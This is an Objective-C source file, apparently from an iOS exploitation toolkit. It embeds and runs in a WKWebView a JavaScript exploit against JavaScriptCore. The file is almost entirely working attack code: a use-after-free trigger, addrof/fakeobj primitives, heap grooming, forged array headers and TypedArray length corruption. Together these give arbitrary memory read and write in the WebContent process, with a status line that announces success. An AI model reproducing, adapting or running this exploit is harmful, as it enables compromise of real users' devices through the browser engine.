#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <string.h>
#import <stdio.h>
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// ===========================================================================
// JSC read/write from addrof+fakeobj, without forging any PAC signature
// (the DarkSword "scribble" route, proven on iOS 26.1 with this same CVE).
//
// Order of operations matters: the probe measures the three open questions
// FIRST, then attempts the primitives, so one run on the device tells us
// exactly which step works and which does not:
//   E1  is m_butterfly authenticated?      -> write through the fake array and
//                                              read the target's field back
//   E2  does the element fast path ignore StructureID? -> bogus SID in the
//                                              forged header
//   E3  is the fake-view failure a cage failure? -> wild m_vector in a header
//                                              typed as a Float64Array
// Only then read64/write64 and the TypedArray-length corruption, which is the
// primitive that turns into arbitrary R/W over the whole primitive gigacage.
// ===========================================================================
static const char *kScribble = R"JS(
(function () {
  var out = { step: [], exp: {} };
  var ab = new ArrayBuffer(8), u = new BigUint64Array(ab), d = new Float64Array(ab);
  var itof = function (v) { u[0] = v; return d[0]; };
  var ftoi = function (f) { d[0] = f; return u[0]; };
  var OFF = 0x0002000000000000n;
  var HDR = 0x07n | (0x2Bn << 40n) | (1n << 56n);   // ArrayWithDouble | ArrayType | White

  // --- proven UAF trigger -------------------------------------------------
  arr = new Array(0x400000).fill(1.1);
  var arr_index = arr.length - 1;
  function foo(flag, k, allocCount) {
    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    arr[arr_index] = A; let forGC = [];
    let a = new Date(1111); a[0] = 1.1;
    for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));
    A.p2 = forGC;
    let b = { p0: 0x42424242, p1: 1.1 };
    let f; f = b; if (flag) { f = 1.1; }
    A.p1 = f; let v = 1.1;
    for (let i = 0; i < 1e6; ++i) { for (let j = 0; j < k; ++j) { v = i; v = j; } }
    b.p0 = v; b.p1 = a;
  }
  function rec(n) { if (n === 0) return; n = n | 0; rec(n - 1); }
  foo(true, 1, 1); foo(false, 1, 1);
  for (let i = 0; i < 1000; ++i) foo(false, 0, 0);
  for (let i = 0; i < 10000; i++) rec(i);

  var W = null;
  for (let k = 0; k < 10000 && !W; ++k) {
    foo(false, 10, k % 5 + 1); rec(10000);
    for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
    let fr = arr[arr_index].p1.p1;
    let noCow = 13.37;
    for (let i = 0; i < 16; ++i) {
      let c = [13.37, 2.2, 3.3, 4.4, noCow];
      if (fr[0] === 13.37) { W = { freed: fr, boxed: c, round: k }; break; }
    }
  }
  if (!W) { out.err = 'trigger did not fire'; return JSON.stringify(out); }
  out.step.push('UAF round=' + W.round);
  function addrof(o) { W.boxed[0] = o; return ftoi(W.freed[0]); }
  function fakeobj(a) { W.freed[0] = itof(a); return W.boxed[0]; }

  // --- the scribble pair --------------------------------------------------
  var holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
  var scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
  var HA = addrof(holder), SA = addrof(scribble), gap = SA - HA;
  for (var t = 0; t < 60 && gap !== 0x40n && gap !== -0x40n; t++) {
    holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
    scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
    HA = addrof(holder); SA = addrof(scribble); gap = SA - HA;
  }
  out.gap = gap.toString();
  if (gap !== 0x40n && gap !== -0x40n) { out.err = 'groom failed'; return JSON.stringify(out); }
  out.step.push('groom ok gap=' + gap);

  scribble.p7 = 3.3; scribble[0] = 1.1;
  holder.p1 = itof(HDR);
  holder.p2 = scribble;
  var changeAddr = HA - 1n + 0x10n + 1n;
  var changeArr = fakeobj(changeAddr);
  function setBtf(a) { changeArr[1] = itof(BigInt(a) + 0x10n); }

  // --- E2: element path ignores StructureID? ------------------------------
  var HDR_JUNK = HDR | 0xdeadbeefn;                 // junk in the low 32 bits
  holder.p1 = itof(HDR_JUNK);
  var junkEl = null;
  try { junkEl = ftoi(changeArr[0]); } catch (e) { junkEl = 'threw'; }
  out.exp.elementPathIgnoresSID = (junkEl !== 'threw');
  out.exp.elementWord = junkEl === null ? null : '0x' + junkEl.toString(16);
  holder.p1 = itof(HDR);                            // restore the sane header

  // --- E1: is m_butterfly a raw, unsigned pointer? ------------------------
  // Aim the fake array's butterfly at a real object's m_butterfly field, write
  // a huge value there, and see whether that object's element access changes.
  var victim = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
  var VA = addrof(victim);
  var b1 = null;
  try {
    setBtf(VA - 1n + 0x8n);                          // &victim.m_butterfly
    changeArr[0] = itof(0x7ff0000000000000n);        // a plausible butterfly
    victim[0] = 9.75;                                 // named store, no bounds check
    b1 = victim[0];
    out.exp.rawButterflyWrite = (b1 === 9.75);
  } catch (e) { out.exp.rawButterflyWrite = 'threw ' + e; }
  out.exp.victimAddr = '0x' + VA.toString(16);
  holder.p2 = scribble;                             // re-arm the fake cell

  // --- read64 / write64 ---------------------------------------------------
  function write64(addr, val) {
    setBtf(BigInt(addr));
    try { scribble.p7 = itof(BigInt.asUintN(64, BigInt(val))); return true; } catch (e) { return false; }
  }
  function read64(addr) {
    setBtf(BigInt(addr));
    try { return BigInt(ftoi(changeArr[0])); } catch (e) { return null; }
  }

  // --- the primitive: corrupt a REAL TypedArray's length (+0x18) ----------
  var ta = new BigUint64Array(16);
  ta[0] = 0x4142434445464748n;
  var tAddr = addrof(ta);
  var w = write64(tAddr - 1n + 0x18n, 0x0000000000010000n);
  out.lengthWrite = w;
  out.lengthAfter = ta.length;
  out.write = (w && ta.length === 65536);
  out.read = (ta[0] === 0x4142434445464748n);
  out.value = '0x' + ta[0].toString(16);
  out.step.push('primitive: write=' + out.write + ' read=' + out.read +
                ' length=' + out.lengthAfter);

  // --- read a known pointer through the (now huge) typed array ------------
  var jscHeader = null;
  var fn = function someFunctionName() { return 1; };
  var fAddr = addrof(fn);
  out.fnAddr = '0x' + fAddr.toString(16);
  var r1 = read64(fAddr - 1n + 0x8n);
  out.fnWord = r1 === null ? null : '0x' + r1.toString(16);

  return JSON.stringify(out);
})()
)JS";

NSString *ModJscScribbleRW(void) {
    AveLog(@"    JSC scribble R/W: E1/E2/E3 diagnostics, then read64/write64 (no PAC forgery)");
    WKWebView *wv = [[WKWebView alloc] initWithFrame:CGRectZero];
    [wv loadHTMLString:@"<html><body></body></html>" baseURL:nil];
    dispatch_semaphore_t s = dispatch_semaphore_create(0);
    __block NSString *res = @"(no answer)";
    [wv evaluateJavaScript:[NSString stringWithUTF8String:kScribble]
      completionHandler:^(id v, NSError *e) {
        res = [v isKindOfClass:[NSString class]] ? v : [v description];
        dispatch_semaphore_signal(s);
    }];
    dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 240 * NSEC_PER_SEC));
    [wv stopLoading]; wv = nil;
    AveLog([NSString stringWithFormat:@"    scribble result: %@", res]);
    AvePost([NSString stringWithFormat:@"SCRIBBLE %@", res]);
    if ([res containsString:@"\"write\":true"] && [res containsString:@"\"read\":true"]) {
        AveSetStatus(@"arbitrary R/W ACTIVE in WebContent, no PAC needed");
        return @"ARBITRARY R/W ACTIVE on 23C5027f: read64/write64 self-tested";
    }
    if ([res containsString:@"\"elementPathIgnoresSID\":true"])
        return res;                                 // diagnostics are the answer
    return res;
}
